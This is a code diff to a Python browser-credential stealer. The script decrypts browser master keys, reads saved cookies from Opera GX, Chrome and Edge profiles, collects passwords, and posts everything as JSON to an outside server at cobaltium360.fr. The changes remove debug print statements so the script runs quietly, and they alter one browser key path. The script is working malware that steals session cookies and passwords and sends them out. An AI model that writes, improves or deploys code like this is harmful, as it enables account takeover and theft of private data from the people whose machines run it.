@@ -32,7 +32,6 @@ def main():
             value = decrypt_cookie(c[2],master_key)
             ls.append(f"{c[0].decode()};{c[1].decode()};{value}")
         cursor.close()
-        print(ls)
         return ls
             
     def decrypt_cookie(cookie, key):
@@ -48,7 +47,7 @@ def main():
     
     MASTER_KEY = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
                 r"AppData\\Local\\Google\\Chrome\\User Data\\Local State",
-                r"AppData\\Local\\Microsoft\\Edge\\User Data\\Local State" ]
+                r"AppData\\Local\\Google\\Chrome\\User Data\\Local State" ]
         
     COOKIES = [ r"AppData\\Roaming\\Opera Software\\Opera GX Stable\\Network\\Cookies", 
             r"AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", 
@@ -78,9 +77,9 @@ def main():
     for i in enumerate(tab):
         if master_key[t] != "":
             try :
-                print(master_key[t])
+                
                 cookies[t] = get_cookie(master_key[t], COOKIES[t], SQL[0])
-                print("oui")
+                
             except Exception as e :
                 error = error+1
         else :
@@ -98,9 +97,7 @@ def main():
         else :
             error = error+1
         t += 1
-    print(master_key)
-    print(cookies)
-    print(password)
+    
     data = {"cookies": cookies, "password": password}
     r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
         
